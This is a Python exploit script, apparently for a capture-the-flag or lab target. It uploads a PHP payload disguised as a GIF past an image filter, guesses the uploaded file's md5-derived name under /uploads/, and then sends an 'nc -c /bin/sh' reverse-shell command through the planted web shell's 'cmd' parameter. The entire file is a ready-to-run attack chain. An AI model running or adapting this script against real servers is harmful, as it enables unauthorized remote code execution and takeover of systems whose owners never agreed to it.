#!/usr/bin/env python3
from sys import argv
from requests import get, post, Session
from hashlib import md5

def get_filename(filepath):
    if "/" in filepath:
        return filepath.split("/")[-1]
    else:
        return filepath

def upload_request(url, filepath, filename):
    try:
        files = {'file': (filename, open(filepath, 'rb'), 'image/gif', {'Expires': '0'})}
        result = post(url+"/upload.php", files=files, data={'submit':'Submit'})
        
        if result.status_code != 200:
            print("Status code:", result.status_code)
            return False
        
        elif ":)" in result.text:
            print("Upload failed. Server detected a non image file")
            return False
        
        elif "File uploaded" in result.text:
            print("Upload completed.")
            return True
        
        else:
            print("Unexpected Response.", result.text)
            return False

    except Exception as err:
        print("Error during uploading payload:", err)
        return False


def fetch_payload(url, filename):
    s = Session()
    
    for i in range(1, 100):
        possible_file = md5((filename+str(i)).encode()).hexdigest()
        possible_url = url + "/uploads/" + possible_file + ".php"
        
        result = s.get(possible_url)
    
        if result.status_code == 200:
            print(" ->", possible_url)
            return possible_url, True
    
    print("Nothing. I failed")
    return None, False

def prompt_revshell(payload_url, ip, port):
    answer = input("Do you want to get a reverse shell? [y/n] ")
    if answer.lower() in ("yes", "y"):
        payload = "nc -c /bin/sh %s %s 2>&1" % (ip, port)
        ready = input("Payload: %s\n Ready? [y/n] " % payload)
        if ready.lower() in ("yes", "y"):
            print("Sending payload")
            result = get(payload_url, params={"cmd": payload})
            print("Code:", result.status_code)
            print("Output:", result.text)

def main():
    if len(argv) < 2:
        print("Usage: ")
        print(" %s <base_url> <path_to_file>" % argv[0])
        return

    url = argv[1]
    filepath = argv[2]
    filename = filepath.split("/")[-1]
    ip = None
    port = None
    
    try:
        ip = argv[3]
        port = argv[4]
    except IndexError:
        pass

    if upload_request(url, filepath, filename):
        payload_url, result = fetch_payload(url, filename)
        if result:
            prompt_revshell(payload_url, ip, port)
if __name__ == "__main__":
    main()
